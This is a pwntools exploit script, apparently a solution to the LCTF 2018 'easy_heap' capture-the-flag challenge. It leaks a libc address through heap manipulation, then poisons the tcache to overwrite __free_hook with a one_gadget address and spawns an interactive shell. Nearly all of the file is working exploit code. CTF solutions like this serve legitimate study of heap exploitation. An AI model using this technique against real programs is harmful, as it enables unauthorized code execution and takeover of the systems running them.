from pwn import *
import sys

if len(sys.argv) < 2:
    debug = True
else:
    debug = False

if debug:
    p = process("./2018_LCTF_easy_heap")
    libc = ELF("/lib/x86_64-linux-gnu/libc-2.27.so")
    elf = ELF("./2018_LCTF_easy_heap")
else:
    pass

def add(size,content):
    p.sendafter("> ","1")
    p.sendafter("> ",str(size))
    p.sendafter("> ",content)

def free(index):
    p.sendafter("> ","2")
    p.sendafter("> ",str(index))

def show(index):
    p.sendafter("> ","3")
    p.sendafter("> ",str(index))

code_base = 0x555555554000
def debugf():
    gdb.attach(p,"b *{b1}".format(b1 = hex(code_base + 0x1029)))


context.log_level = "debug"
context.terminal = ["tmux","splitw","-h"]
for i in range(10):
    add(0x1,'\n')
for i in range(3,10):
    free(i)
free(0) #8
free(1) #9
free(2)
for i in range(10):
    add(0x1,"\n")
for i in range(8):
    free(i)
add(0x1,"\n")
free(8)
add(0xf8,"\n")
free(0)
free(9)
for i in range(8):
    add(0x1,"\n")
show(1)
leak_addr = u64(p.recvuntil("\n",drop = True).ljust(8,"\x00"))
libc.address = leak_addr - 96 - 0x10 - libc.symbols["__malloc_hook"]
log.success("libc_base:"+hex(libc.address))
#debugf()
add(0x1,"\n")
free(0)
free(2)
free(1)
free(9)
add(0x9,p64(libc.symbols["__free_hook"]).strip("\x00") + "\n")
add(0x10,";/bin/bash\x00")
target = libc.address + 0x4f322
#target = libc.symbols["system"]
add(0x9,p64(target).strip("\x00") + "\n")
free(1)
p.interactive()
